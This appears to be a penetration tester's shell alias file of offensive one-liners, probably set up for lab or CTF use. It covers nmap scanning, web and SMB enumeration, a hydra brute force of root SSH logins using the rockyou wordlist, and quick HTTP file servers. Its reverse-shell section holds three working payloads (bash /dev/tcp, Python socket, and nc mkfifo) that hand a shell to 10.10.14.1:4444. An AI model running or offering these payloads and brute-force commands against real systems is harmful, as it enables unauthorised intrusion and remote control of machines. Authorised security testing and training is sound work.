# ──[ Basic Recon & Scanning ]──
alias myip='ip route get 1.2.3.4 | awk '\''{print $7; exit}'\'''
alias scanme='nmap -sC -sV -p-'
alias fastscan='nmap -F'
alias fulltcp='nmap -p- -T4'
alias stealthscan='nmap -sS -T3 --open'
alias udp='sudo nmap -sU -p-'
alias osdetect='nmap -O --osscan-guess'

# ──[ Web Enumeration ]──
alias webscan='nikto -h'
alias dirbust='gobuster dir -u'
alias vhosts='gobuster vhost -u http://TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt'

# ──[ SMB Enumeration ]──
alias enum4linux='docker run --rm -it --network host aafscdv/enum4linux-ng'
alias smbcheck='smbclient -L'

# ──[ Password Cracking & Bruteforce ]──
alias hydra-ssh='hydra -t 4 -l root -P /usr/share/wordlists/rockyou.txt ssh://'
alias johnzip='zip2john > hash.txt && john hash.txt'

# ──[ File Transfer Tricks ]──
alias pythonserve3='python3 -m http.server 80'
alias pythonserve2='python -m SimpleHTTPServer 80'

# ──[ Shells & Reverse Shells ]──
alias revbash='bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'
alias revpython='python3 -c '\''import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.1",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(["/bin/sh"])'\'''
alias revnc='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.1 4444 >/tmp/f'

# ──[ Utilities ]──
alias sniff='sudo tcpdump -i any'
alias ports='netstat -tulnp'
alias top10='cut -d: -f2 /usr/share/seclists/Discovery/DNS/top-1million.txt | head -n 10'
